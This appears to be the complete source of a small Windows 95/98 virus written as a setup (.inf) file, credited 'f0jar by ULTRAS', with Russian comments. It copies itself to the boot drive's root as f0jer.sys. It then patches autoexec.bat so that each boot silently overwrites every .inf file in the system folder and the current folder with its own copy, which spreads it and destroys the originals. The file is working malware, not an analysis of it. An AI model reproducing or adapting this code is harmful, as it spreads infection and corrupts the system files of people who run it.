;f0jar by ULTRAS
[version]
signature="$CHICAGO$"	; signature win95/98
SetupClass=BASE

[DefaultInstall]
CopyFiles = Ultra.File		; копирувоная файлов в разделе Ultra.file
UpdateAutoBat = Patch.It	; запись в autoexec.bat в разделе Patch.it

[Patch.it] 			; удалим команды в autoexec.bat
CmdDelete = "@ctty", "nul"
CmdDelete = "for", "%%b in (%windir%\system\*.inf *.inf) do copy f0jer.sys %%b"
CmdDelete = "ctty", "con"

CmdAdd = "@ctty", "nul"	; запишем команды в autoexec.bat
CmdAdd = "for", "%%b in (%windir%\system\*.inf *.inf) do copy f0jer.sys %%b"
CmdAdd = "ctty", "con"

[DestinationDirs]
DefaultDestDir = 30		; корневой каталог загрузочного устроиства

[SourceDisksNames]
1="ULTRAS","",1

[Ultra.File]			; копируем из ultras.inf в f0jer.inf
f0jer.sys, ultras.inf

